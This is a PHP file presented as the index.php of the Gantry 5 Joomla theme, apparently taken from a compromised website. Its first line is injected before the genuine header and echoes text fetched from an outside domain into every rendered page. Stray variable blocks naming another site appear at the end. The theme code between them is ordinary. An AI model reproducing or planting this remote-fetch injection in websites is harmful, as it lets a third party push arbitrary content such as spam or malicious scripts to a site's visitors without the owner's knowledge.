<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
<?php
/**
 * @package   Gantry 5 Theme
 * @author    RocketTheme http://www.rockettheme.com
 * @copyright Copyright (C) 2007 - 2015 RocketTheme, LLC
 * @license   GNU/GPLv2 and later
 *
 * http://www.gnu.org/licenses/gpl-2.0.html
 */

defined('_JEXEC') or die;

// Bootstrap Gantry framework or fail gracefully (inside included file).
$gantry = include __DIR__ . '/includes/gantry.php';

/** @var \Gantry\Framework\Theme $theme */
$theme = $gantry['theme'];

/** @var \Gantry\Framework\Outlines $configurations */
$configurations = $gantry['configurations'];

// All the custom twig variables can be defined in here:
$context = array();

// Render the page.
echo $theme
    ->setLayout($configurations->current())
    ->render('index.html.twig', $context);
?>
<?php 
$site = "purpled.pt"; 
$mode = "1"; 
 
?>
  <?php 
$site = "purpled.pt"; 
$mode = ""; 

?>
